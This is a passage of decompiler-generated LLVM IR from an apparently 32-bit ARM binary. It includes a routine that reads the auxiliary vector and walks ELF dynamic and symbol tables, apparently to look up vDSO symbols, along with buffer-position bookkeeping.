  %v1_167bc = load i32, i32* %r1.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_167bc, %v1_167bc
  br i1 %tmp, label %dec_label_pc_167a0, label %dec_label_pc_167b0

; uselistorder directives
  uselistorder i32 %v1_16798, { 1, 0 }
  uselistorder i32 %v0_16798, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 8, 5, 7, 6, 4, 3 }
  uselistorder label %dec_label_pc_167b4, { 1, 0 }
}

define i32 @function_167c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_167c8:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_167c8 = load i32, i32* @r4, align 4
  store i32 %v3_167c8, i32* %stack_var_-28, align 4
  %v1_167cc = add i32 %arg1, 112
  %v1_167d0 = inttoptr i32 %v1_167cc to i32*
  %v2_167d0 = load i32, i32* %v1_167d0, align 4
  %v3_167d0 = add i32 %arg1, 116
  %v4_167d0 = inttoptr i32 %v3_167d0 to i32*
  %v5_167d0 = load i32, i32* %v4_167d0, align 4
  store i32 %v5_167d0, i32* @r2, align 4
  %v2_167d4 = or i32 %v5_167d0, %v2_167d0
  %v4_167d4 = icmp eq i32 %v2_167d4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v4_167d4, label %dec_label_pc_16818, label %dec_label_pc_167e4

dec_label_pc_167e4:                               ; preds = %dec_label_pc_167c8
  %v1_167e4 = add i32 %arg1, 124
  %v2_167e4 = inttoptr i32 %v1_167e4 to i32*
  %v3_167e4 = load i32, i32* %v2_167e4, align 4
  %v5_167ec = icmp slt i32 %v3_167e4, %v5_167d0
  br i1 %v5_167ec, label %dec_label_pc_16818, label %dec_label_pc_167f0

dec_label_pc_167f0:                               ; preds = %dec_label_pc_167e4
  %v9_167e8 = icmp eq i32 %v3_167e4, %v5_167d0
  br i1 %v9_167e8, label %dec_label_pc_1680c, label %dec_label_pc_167f4

dec_label_pc_167f4:                               ; preds = %dec_label_pc_1680c, %dec_label_pc_16818, %dec_label_pc_167f0
  %v1_167f8 = phi i32 [ %arg1, %dec_label_pc_1680c ], [ %arg1, %dec_label_pc_167f0 ], [ %v1_167f8.pre, %dec_label_pc_16818 ]
  %v2_167f8 = add i32 %v1_167f8, 104
  %v3_167f8 = inttoptr i32 %v2_167f8 to i32*
  store i32 0, i32* %v3_167f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16800

dec_label_pc_16800:                               ; preds = %bb, %dec_label_pc_16870, %dec_label_pc_167f4
  %v1_16808 = phi i32 [ %v1_16808.pre, %bb ], [ %v4_16870, %dec_label_pc_16870 ], [ -1, %dec_label_pc_167f4 ]
  %v2_16804 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16804, i32* @r4, align 4
  ret i32 %v1_16808

dec_label_pc_1680c:                               ; preds = %dec_label_pc_167f0
  %v1_1680c = add i32 %arg1, 120
  %v2_1680c = inttoptr i32 %v1_1680c to i32*
  %v3_1680c = load i32, i32* %v2_1680c, align 4
  %v3_16810 = icmp ult i32 %v3_1680c, %v2_167d0
  br i1 %v3_16810, label %dec_label_pc_16818, label %dec_label_pc_167f4

dec_label_pc_16818:                               ; preds = %dec_label_pc_1680c, %dec_label_pc_167e4, %dec_label_pc_167c8
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_1681c = call i32 @function_16f28(i32 %arg1)
  store i32 %v1_1681c, i32* %r0.global-to-local, align 4
  %v1_16820 = icmp slt i32 %v1_1681c, 0
  %v1_167f8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v1_16820, label %dec_label_pc_167f4, label %dec_label_pc_16828

dec_label_pc_16828:                               ; preds = %dec_label_pc_16818
  %v1_16828 = add i32 %v1_167f8.pre, 112
  %v1_1682c = inttoptr i32 %v1_16828 to i32*
  %v2_1682c = load i32, i32* %v1_1682c, align 4
  %v3_1682c = add i32 %v1_167f8.pre, 116
  %v4_1682c = inttoptr i32 %v3_1682c to i32*
  %v5_1682c = load i32, i32* %v4_1682c, align 4
  store i32 %v5_1682c, i32* @r2, align 4
  %v2_16830 = or i32 %v5_1682c, %v2_1682c
  %v4_16830 = icmp eq i32 %v2_16830, 0
  br i1 %v4_16830, label %dec_label_pc_16838, label %dec_label_pc_16880

dec_label_pc_16838:                               ; preds = %dec_label_pc_16828
  %v1_16838 = add i32 %v1_167f8.pre, 4
  %v2_16838 = inttoptr i32 %v1_16838 to i32*
  %v3_16838 = load i32, i32* %v2_16838, align 4
  store i32 %v3_16838, i32* %lr.global-to-local, align 4
  %v1_1683c = add i32 %v1_167f8.pre, 8
  %v2_1683c = inttoptr i32 %v1_1683c to i32*
  %v3_1683c = load i32, i32* %v2_1683c, align 4
  store i32 %v3_1683c, i32* @ip, align 4
  br label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_168c8, %dec_label_pc_168c4, %dec_label_pc_16838
  %v0_16840 = phi i32 [ %v3_1688c, %dec_label_pc_168c4 ], [ %v3_1688c, %dec_label_pc_168c8 ], [ %v3_1683c, %dec_label_pc_16838 ]
  %v2_16840 = add i32 %v1_167f8.pre, 104
  %v3_16840 = inttoptr i32 %v2_16840 to i32*
  store i32 %v0_16840, i32* %v3_16840, align 4
  br label %dec_label_pc_16844

dec_label_pc_16844:                               ; preds = %dec_label_pc_168b0, %dec_label_pc_16840
  %v0_16844 = load i32, i32* @ip, align 4
  %v2_16844 = icmp eq i32 %v0_16844, 0
  br i1 %v2_16844, label %dec_label_pc_16870, label %dec_label_pc_1684c

dec_label_pc_1684c:                               ; preds = %dec_label_pc_16844
  %v1_1684c = add i32 %v0_16844, 1
  %v0_16850 = load i32, i32* %r5.global-to-local, align 4
  %v1_16850 = add i32 %v0_16850, 120
  %v1_16854 = inttoptr i32 %v1_16850 to i32*
  %v2_16854 = load i32, i32* %v1_16854, align 4
  %v3_16854 = add i32 %v0_16850, 124
  %v4_16854 = inttoptr i32 %v3_16854 to i32*
  %v5_16854 = load i32, i32* %v4_16854, align 4
  %v0_16858 = load i32, i32* %lr.global-to-local, align 4
  %v2_16858 = sub i32 %v1_1684c, %v0_16858
  %v3_1685c = ashr i32 %v2_16858, 31
  %v2_16860 = add i32 %v2_16858, %v2_16854
  %v3_16860 = icmp ult i32 %v2_16860, %v2_16854
  %v3_16864 = add i32 %v3_1685c, %v5_16854
  %v4_16864 = zext i1 %v3_16860 to i32
  %v5_16864 = add i32 %v4_16864, %v3_16864
  store i32 %v5_16864, i32* @r2, align 4
  store i32 %v2_16860, i32* %v1_16854, align 4
  %v0_1686c = load i32, i32* @r2, align 4
  %v1_1686c = load i32, i32* %r5.global-to-local, align 4
  %v2_1686c = add i32 %v1_1686c, 124
  %v3_1686c = inttoptr i32 %v2_1686c to i32*
  store i32 %v0_1686c, i32* %v3_1686c, align 4
  br label %dec_label_pc_16870

dec_label_pc_16870:                               ; preds = %dec_label_pc_16844, %dec_label_pc_1684c
  %v0_16870 = load i32, i32* %lr.global-to-local, align 4
  %v1_16870 = add i32 %v0_16870, -1
  %v2_16870 = inttoptr i32 %v1_16870 to i8*
  %v3_16870 = load i8, i8* %v2_16870, align 1
  %v4_16870 = zext i8 %v3_16870 to i32
  %v0_16874 = load i32, i32* %r0.global-to-local, align 4
  %v9_16874 = icmp eq i32 %v0_16874, %v4_16870
  br i1 %v9_16874, label %dec_label_pc_16800, label %bb

bb:                                               ; preds = %dec_label_pc_16870
  %v2_16878 = trunc i32 %v0_16874 to i8
  store i8 %v2_16878, i8* %v2_16870, align 1
  %v1_16808.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16800

dec_label_pc_16880:                               ; preds = %dec_label_pc_16828
  %v1_16880 = add i32 %v1_167f8.pre, 120
  %v1_16884 = inttoptr i32 %v1_16880 to i32*
  %v2_16884 = load i32, i32* %v1_16884, align 4
  %v3_16884 = add i32 %v1_167f8.pre, 124
  %v4_16884 = inttoptr i32 %v3_16884 to i32*
  %v5_16884 = load i32, i32* %v4_16884, align 4
  %v1_16888 = add i32 %v1_167f8.pre, 4
  %v2_16888 = inttoptr i32 %v1_16888 to i32*
  %v3_16888 = load i32, i32* %v2_16888, align 4
  store i32 %v3_16888, i32* %lr.global-to-local, align 4
  %v1_1688c = add i32 %v1_167f8.pre, 8
  %v2_1688c = inttoptr i32 %v1_1688c to i32*
  %v3_1688c = load i32, i32* %v2_1688c, align 4
  store i32 %v3_1688c, i32* @ip, align 4
  %v1_16890 = sub i32 -1, %v2_16884
  %v2_16894 = add i32 %v2_1682c, %v1_16890
  %v3_16894 = icmp ult i32 %v2_16894, %v1_16890
  %v1_16898 = sub i32 -1, %v5_16884
  %v2_1689c = sub i32 %v3_1688c, %v3_16888
  %v3_168a0 = add i32 %v5_1682c, %v1_16898
  %v4_168a0 = zext i1 %v3_16894 to i32
  %v5_168a0 = add i32 %v3_168a0, %v4_168a0
  %v3_168a4 = ashr i32 %v2_1689c, 31
  %v7_168ac = icmp sgt i32 %v3_168a4, %v5_168a0
  br i1 %v7_168ac, label %dec_label_pc_168b0, label %dec_label_pc_168c4

dec_label_pc_168b0:                               ; preds = %dec_label_pc_168c8, %dec_label_pc_16880
  %v2_168b0 = sub i32 %v2_1682c, %v2_16884
  store i32 %v2_168b0, i32* @r2, align 4
  %v1_168b4 = add i32 %v2_168b0, -1
  %v2_168b8 = add i32 %v1_168b4, %v3_16888
  %v2_168bc = add i32 %v1_167f8.pre, 104
  %v3_168bc = inttoptr i32 %v2_168bc to i32*
  store i32 %v2_168b8, i32* %v3_168bc, align 4
  br label %dec_label_pc_16844

dec_label_pc_168c4:                               ; preds = %dec_label_pc_16880
  %v9_168a8 = icmp eq i32 %v3_168a4, %v5_168a0
  br i1 %v9_168a8, label %dec_label_pc_168c8, label %dec_label_pc_16840

dec_label_pc_168c8:                               ; preds = %dec_label_pc_168c4
  %tmp = icmp ugt i32 %v2_1689c, %v2_16894
  br i1 %tmp, label %dec_label_pc_168b0, label %dec_label_pc_16840

; uselistorder directives
  uselistorder i32 %v3_168a4, { 1, 0 }
  uselistorder i32 %v3_1688c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16884, { 1, 0 }
  uselistorder i32 %v4_16870, { 1, 0 }
  uselistorder i32 %v2_16854, { 1, 0 }
  uselistorder i32 %v2_1682c, { 2, 0, 1 }
  uselistorder i32 %v1_167f8.pre, { 9, 7, 8, 4, 3, 10, 5, 6, 2, 1, 0 }
  uselistorder i32 %v3_167e4, { 1, 0 }
  uselistorder i32 %v5_167d0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_167d0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 31, { 14, 15, 16, 0, 17, 18, 24, 25, 21, 5, 6, 7, 8, 22, 9, 10, 23, 20, 19, 1, 2, 11, 3, 12, 4, 13 }
  uselistorder i32 104, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 2, 23, 1, 24 }
  uselistorder i32 124, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg1, { 3, 2, 7, 0, 1, 8, 4, 6, 5, 9 }
  uselistorder label %dec_label_pc_16870, { 1, 0 }
  uselistorder label %dec_label_pc_167f4, { 1, 0, 2 }
}

define i32 @function_168d4() local_unnamed_addr {
dec_label_pc_168d4:
  %stack_var_0 = alloca i32, align 4
  %v1_168d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_168d4, i32* @ip, align 4
  %v0_168e0 = load i32, i32* @r1, align 4
  %v0_168e8 = load i32, i32* @r3, align 4
  store i32 %v0_168e8, i32* @r2, align 4
  ret i32 %v0_168e0
}

define i32 @function_16904(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16904:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16908 = load i32, i32* @r4, align 4
  store i32 %v3_16908, i32* %stack_var_-36, align 4
  %v3_1690c = load i32, i32* @global_var_22b3c.530, align 4
  %v1_16910 = inttoptr i32 %v3_1690c to i32*
  %v2_16910 = load i32, i32* %v1_16910, align 4
  %v7_16914 = icmp eq i32 %v2_16910, 33
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v0_16920 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16920, i32* %r8.global-to-local, align 4
  br i1 %v7_16914, label %.thread, label %dec_label_pc_1692c

.thread:                                          ; preds = %dec_label_pc_16904
  %v1_16914 = add i32 %v2_16910, -33
  br label %dec_label_pc_16958

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16904
  %v2_1692c = icmp eq i32 %v2_16910, 0
  br i1 %v2_1692c, label %dec_label_pc_169d0, label %dec_label_pc_16944.preheader

dec_label_pc_16944.preheader:                     ; preds = %dec_label_pc_1692c
  store i32 8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %dec_label_pc_16944, %dec_label_pc_16944.preheader
  %v0_16950 = phi i32 [ 8, %dec_label_pc_16944.preheader ], [ %v1_16950, %dec_label_pc_16944 ]
  %v2_16948 = add i32 %v0_16950, %v3_1690c
  %v3_16948 = inttoptr i32 %v2_16948 to i32*
  %v4_16948 = load i32, i32* %v3_16948, align 4
  %v1_16950 = add i32 %v0_16950, 8
  store i32 %v1_16950, i32* %r1.global-to-local, align 4
  switch i32 %v4_16948, label %dec_label_pc_16944 [
    i32 33, label %dec_label_pc_16958.loopexit
    i32 0, label %dec_label_pc_169d0.loopexit17
  ]

dec_label_pc_16958.loopexit:                      ; preds = %dec_label_pc_16944
  br label %dec_label_pc_16958

dec_label_pc_16958:                               ; preds = %.thread, %dec_label_pc_16958.loopexit
  %v0_16958 = phi i32 [ %v0_16950, %dec_label_pc_16958.loopexit ], [ %v1_16914, %.thread ]
  %v2_16958 = add i32 %v0_16958, %v3_1690c
  %v1_1695c = add i32 %v2_16958, 4
  %v2_1695c = inttoptr i32 %v1_1695c to i32*
  %v3_1695c = load i32, i32* %v2_1695c, align 4
  %v1_16960 = add i32 %v3_1695c, 44
  %v2_16960 = inttoptr i32 %v1_16960 to i16*
  %v3_16960 = load i16, i16* %v2_16960, align 2
  %v4_16960 = zext i16 %v3_16960 to i32
  %v2_16964 = icmp eq i16 %v3_16960, 0
  br i1 %v2_16964, label %dec_label_pc_169d0, label %dec_label_pc_16970

dec_label_pc_16970:                               ; preds = %dec_label_pc_16958
  %v1_16968 = add i32 %v3_1695c, 28
  %v2_16968 = inttoptr i32 %v1_16968 to i32*
  %v3_16968 = load i32, i32* %v2_16968, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16974 = add i32 %v3_1695c, 42
  %v2_16974 = inttoptr i32 %v1_16974 to i16*
  %v3_16974 = load i16, i16* %v2_16974, align 2
  %v4_16974 = zext i16 %v3_16974 to i32
  %v2_16978 = add i32 %v3_16968, %v3_1695c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %.thread4, %dec_label_pc_16970
  %v1_169bc38 = phi i32 [ %v0_169ec, %.thread4 ], [ 0, %dec_label_pc_16970 ]
  %v0_169b836 = phi i32 [ %v0_169b8, %.thread4 ], [ -1, %dec_label_pc_16970 ]
  %v0_169a8 = phi i32 [ %v1_169a8, %.thread4 ], [ 0, %dec_label_pc_16970 ]
  %v0_169b0 = phi i32 [ %v2_169b0, %.thread4 ], [ %v2_16978, %dec_label_pc_16970 ]
  %v1_16984 = inttoptr i32 %v0_169b0 to i32*
  %v2_16984 = load i32, i32* %v1_16984, align 4
  switch i32 %v2_16984, label %.thread4 [
    i32 1, label %.thread2
    i32 2, label %bb
  ]

.thread2:                                         ; preds = %dec_label_pc_16984
  %v2_1698c = add i32 %v0_169b0, 4
  %v3_1698c = inttoptr i32 %v2_1698c to i32*
  %v4_1698c = load i32, i32* %v3_1698c, align 4
  %v5_1698c = add i32 %v0_169b0, 8
  %v6_1698c = inttoptr i32 %v5_1698c to i32*
  %v7_1698c = load i32, i32* %v6_1698c, align 4
  %v3_16990 = sub i32 %v4_1698c, %v7_1698c
  %v3_16994 = add i32 %v3_16990, %v3_1695c
  store i32 %v3_16994, i32* %r5.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_16984
  %v2_169a0 = add i32 %v0_169b0, 4
  %v3_169a0 = inttoptr i32 %v2_169a0 to i32*
  %v4_169a0 = load i32, i32* %v3_169a0, align 4
  %v3_169a4 = add i32 %v4_169a0, %v3_1695c
  store i32 %v3_169a4, i32* %r4.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16984, %.thread2, %bb
  %v0_169ec = phi i32 [ %v1_169bc38, %.thread2 ], [ %v3_169a4, %bb ], [ %v1_169bc38, %dec_label_pc_16984 ]
  %v0_169b8 = phi i32 [ %v3_16994, %.thread2 ], [ %v0_169b836, %bb ], [ %v0_169b836, %dec_label_pc_16984 ]
  %v1_169a8 = add i32 %v0_169a8, 1
  store i32 %v1_169a8, i32* %r1.global-to-local, align 4
  %v9_169ac = icmp eq i32 %v1_169a8, %v4_16960
  %v2_169b0 = add i32 %v0_169b0, %v4_16974
  br i1 %v9_169ac, label %dec_label_pc_169b8, label %dec_label_pc_16984

dec_label_pc_169b8:                               ; preds = %.thread4
  %v7_169b8 = icmp eq i32 %v0_169b8, -1
  br i1 %v7_169b8, label %.thread8, label %bb71

bb71:                                             ; preds = %dec_label_pc_169b8
  %v3_169bc = icmp eq i32 %v0_169ec, 0
  br i1 %v3_169bc, label %bb72, label %dec_label_pc_169dc

.thread8:                                         ; preds = %dec_label_pc_169b8
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_169d0

bb72:                                             ; preds = %bb71
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_169d0

dec_label_pc_169d0.loopexit17:                    ; preds = %dec_label_pc_16944
  br label %dec_label_pc_169d0

dec_label_pc_169d0:                               ; preds = %dec_label_pc_16aa8, %bb72, %bb80, %dec_label_pc_169d0.loopexit17, %dec_label_pc_1692c, %.thread16, %.thread8, %dec_label_pc_16958, %dec_label_pc_169dc, %dec_label_pc_16a78, %bb82, %dec_label_pc_16b80
  %storemerge = phi i32 [ %v2_16b84, %dec_label_pc_16b80 ], [ 0, %bb72 ], [ 0, %bb82 ], [ 0, %dec_label_pc_16a78 ], [ 0, %bb80 ], [ 0, %dec_label_pc_169dc ], [ 0, %dec_label_pc_16958 ], [ 0, %.thread8 ], [ 0, %.thread16 ], [ 0, %dec_label_pc_1692c ], [ 0, %dec_label_pc_169d0.loopexit17 ], [ 0, %dec_label_pc_16aa8 ]
  %v2_169d4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_169d4, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

dec_label_pc_169dc:                               ; preds = %bb71
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_169dc = inttoptr i32 %v0_169ec to i32*
  %v2_169dc = load i32, i32* %v1_169dc, align 4
  %v2_169e0 = icmp eq i32 %v2_169dc, 0
  br i1 %v2_169e0, label %dec_label_pc_169d0, label %dec_label_pc_169e8

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169dc
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_169ec = add i32 %v0_169ec, 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a08:                               ; preds = %dec_label_pc_16a44
  switch i32 %v0_16a58, label %bb75 [
    i32 4, label %bb73
    i32 5, label %bb74
  ]

bb73:                                             ; preds = %dec_label_pc_16a08
  store i32 %v2_16a38, i32* %sl.global-to-local, align 4
  br label %bb75

bb74:                                             ; preds = %dec_label_pc_16a08
  store i32 %v2_16a38, i32* %r6.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %dec_label_pc_16a48, %dec_label_pc_16a08, %bb76, %bb77, %bb73, %bb78, %bb74
  %v0_16a84 = phi i32 [ %v2_16a38, %bb78 ], [ %v0_16a8455, %bb77 ], [ %v0_16a8455, %bb73 ], [ %v0_16a8455, %bb76 ], [ %v0_16a8455, %bb74 ], [ %v0_16a8455, %dec_label_pc_16a08 ], [ %v0_16a8455, %dec_label_pc_16a48 ]
  %v0_16a8c = phi i32 [ %v0_16a7853, %bb78 ], [ %v0_16a7853, %bb77 ], [ %v2_16a38, %bb73 ], [ %v0_16a7853, %bb76 ], [ %v0_16a7853, %bb74 ], [ %v0_16a7853, %dec_label_pc_16a08 ], [ %v0_16a7853, %dec_label_pc_16a48 ]
  %v0_16a9c = phi i32 [ %v0_16a6448, %bb78 ], [ %v0_16a6448, %bb77 ], [ %v0_16a6448, %bb73 ], [ %v2_16a38, %bb76 ], [ %v0_16a6448, %bb74 ], [ %v0_16a6448, %dec_label_pc_16a08 ], [ %v0_16a6448, %dec_label_pc_16a48 ]
  %v1_16a68 = phi i32 [ %v1_16a6850, %bb78 ], [ %v1_16a6850, %bb77 ], [ %v1_16a6850, %bb73 ], [ %v1_16a6850, %bb76 ], [ %v2_16a38, %bb74 ], [ %v1_16a6850, %dec_label_pc_16a08 ], [ %v1_16a6850, %dec_label_pc_16a48 ]
  %v2_16a1c = add i32 %v0_16a24, %v0_169ec
  %v3_16a1c = inttoptr i32 %v2_16a1c to i32*
  %v4_16a1c = load i32, i32* %v3_16a1c, align 4
  %v2_16a20 = icmp eq i32 %v4_16a1c, 0
  %v1_16a28 = add i32 %v0_16a24, 8
  br i1 %v2_16a20, label %dec_label_pc_16a64, label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %bb75, %dec_label_pc_169e8
  %v0_16a8455 = phi i32 [ %v0_16a84, %bb75 ], [ 0, %dec_label_pc_169e8 ]
  %v0_16a7853 = phi i32 [ %v0_16a8c, %bb75 ], [ 0, %dec_label_pc_169e8 ]
  %v1_16a6850 = phi i32 [ %v1_16a68, %bb75 ], [ 0, %dec_label_pc_169e8 ]
  %v0_16a6448 = phi i32 [ %v0_16a9c, %bb75 ], [ 0, %dec_label_pc_169e8 ]
  %v0_16a30 = phi i32 [ %v0_16a24, %bb75 ], [ 0, %dec_label_pc_169e8 ]
  %v0_16a24 = phi i32 [ %v1_16a28, %bb75 ], [ 8, %dec_label_pc_169e8 ]
  %v0_16a58 = phi i32 [ %v4_16a1c, %bb75 ], [ %v2_169dc, %dec_label_pc_169e8 ]
  %v2_16a30 = add i32 %v0_16a30, %v1_169ec
  %v3_16a30 = inttoptr i32 %v2_16a30 to i32*
  %v4_16a30 = load i32, i32* %v3_16a30, align 4
  %v7_16a34 = icmp eq i32 %v0_16a58, 6
  %v2_16a38 = add i32 %v4_16a30, %v0_169b8
  br i1 %v7_16a34, label %bb76, label %dec_label_pc_16a44

bb76:                                             ; preds = %dec_label_pc_16a30
  store i32 %v2_16a38, i32* %r1.global-to-local, align 4
  br label %bb75

dec_label_pc_16a44:                               ; preds = %dec_label_pc_16a30
  %v2_16a34 = icmp ugt i32 %v0_16a58, 5
  br i1 %v2_16a34, label %dec_label_pc_16a48, label %dec_label_pc_16a08

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a44
  switch i32 %v0_16a58, label %bb75 [
    i32 1879048176, label %bb77
    i32 1879048188, label %bb78
  ]

bb77:                                             ; preds = %dec_label_pc_16a48
  store i32 %v2_16a38, i32* %fp.global-to-local, align 4
  br label %bb75

bb78:                                             ; preds = %dec_label_pc_16a48
  store i32 %v2_16a38, i32* %sb.global-to-local, align 4
  br label %bb75

dec_label_pc_16a64:                               ; preds = %bb75
  %v2_16a64 = icmp eq i32 %v0_16a9c, 0
  br i1 %v2_16a64, label %.thread16, label %bb79

bb79:                                             ; preds = %dec_label_pc_16a64
  %v3_16a68 = icmp eq i32 %v1_16a68, 0
  br i1 %v3_16a68, label %bb80, label %dec_label_pc_16a78

.thread16:                                        ; preds = %dec_label_pc_16a64
  br label %dec_label_pc_169d0

bb80:                                             ; preds = %bb79
  br label %dec_label_pc_169d0

dec_label_pc_16a78:                               ; preds = %bb79
  %v2_16a78 = icmp eq i32 %v0_16a8c, 0
  br i1 %v2_16a78, label %dec_label_pc_169d0, label %dec_label_pc_16a80

dec_label_pc_16a80:                               ; preds = %dec_label_pc_16a78
  %v1_16a80 = add i32 %v0_16a8c, 4
  %v2_16a80 = inttoptr i32 %v1_16a80 to i32*
  %v3_16a80 = load i32, i32* %v2_16a80, align 4
  %v2_16a84 = icmp eq i32 %v0_16a84, 0
  br i1 %v2_16a84, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_16a80
  store i32 0, i32* %fp.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_16a80, %bb81
  store i32 %v1_16a80, i32* %sl.global-to-local, align 4
  %v2_16a90 = icmp eq i32 %v3_16a80, 0
  br i1 %v2_16a90, label %dec_label_pc_169d0, label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %bb82
  store i32 %v0_16a9c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16ac0

dec_label_pc_16aa8.loopexit:                      ; preds = %dec_label_pc_16b34
  br label %dec_label_pc_16aa8

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16aa8.loopexit, %dec_label_pc_16b64, %dec_label_pc_16afc, %dec_label_pc_16af0, %dec_label_pc_16ad8, %dec_label_pc_16ac0
  %v2_16aac = load i32, i32* %v2_16a80, align 4
  %v0_16ab0 = load i32, i32* %sl.global-to-local, align 4
  %v1_16ab0 = add i32 %v0_16ab0, 1
  store i32 %v1_16ab0, i32* %sl.global-to-local, align 4
  %v0_16ab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_16ab8 = add i32 %v0_16ab8, 16
  store i32 %v1_16ab8, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v2_16aac, %v1_16ab0
  br i1 %tmp, label %dec_label_pc_16ac0, label %dec_label_pc_169d0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16aa8, %dec_label_pc_16a9c
  %v0_16afc = phi i32 [ %v1_16ab8, %dec_label_pc_16aa8 ], [ %v0_16a9c, %dec_label_pc_16a9c ]
  %v1_16ac0 = add i32 %v0_16afc, 12
  %v2_16ac0 = inttoptr i32 %v1_16ac0 to i8*
  %v3_16ac0 = load i8, i8* %v2_16ac0, align 1
  %v4_16ac0 = zext i8 %v3_16ac0 to i32
  store i32 %v4_16ac0, i32* %r1.global-to-local, align 4
  %tmp87 = urem i8 %v3_16ac0, 16
  %v1_16ac8 = zext i8 %tmp87 to i32
  %v6_16acc = lshr i32 39, %v1_16ac8
  %v1_16ad0 = urem i32 %v6_16acc, 2
  %v2_16ad0 = icmp eq i32 %v1_16ad0, 0
  br i1 %v2_16ad0, label %dec_label_pc_16aa8, label %dec_label_pc_16ad8

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16ac0
  %div = udiv i8 %v3_16ac0, 16
  %v3_16adc = zext i8 %div to i32
  %v6_16ae4 = lshr i32 1030, %v3_16adc
  %v1_16ae8 = urem i32 %v6_16ae4, 2
  %v2_16ae8 = icmp eq i32 %v1_16ae8, 0
  br i1 %v2_16ae8, label %dec_label_pc_16aa8, label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ad8
  %v1_16af0 = add i32 %v0_16afc, 14
  %v2_16af0 = inttoptr i32 %v1_16af0 to i16*
  %v3_16af0 = load i16, i16* %v2_16af0, align 2
  %v2_16af4 = icmp eq i16 %v3_16af0, 0
  br i1 %v2_16af4, label %dec_label_pc_16aa8, label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16af0
  %v4_16af0 = zext i16 %v3_16af0 to i32
  %v1_16afc = inttoptr i32 %v0_16afc to i32*
  %v2_16afc = load i32, i32* %v1_16afc, align 4
  %v0_16b00 = load i32, i32* %r8.global-to-local, align 4
  %v0_16b04 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b04 = add i32 %v0_16b04, %v2_16afc
  store i32 %v2_16b04, i32* %r1.global-to-local, align 4
  %v4_16b08 = inttoptr i32 %v0_16b00 to i8*
  %v5_16b08 = call i32 @function_16f74(i8* %v4_16b08, i32 %v2_16b04, i32 %v3_16adc, i32 %v4_16af0)
  %v2_16b0c = icmp eq i32 %v5_16b08, 0
  br i1 %v2_16b0c, label %dec_label_pc_16b14, label %dec_label_pc_16aa8

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16afc
  %v0_16b14 = load i32, i32* %fp.global-to-local, align 4
  %v2_16b14 = icmp eq i32 %v0_16b14, 0
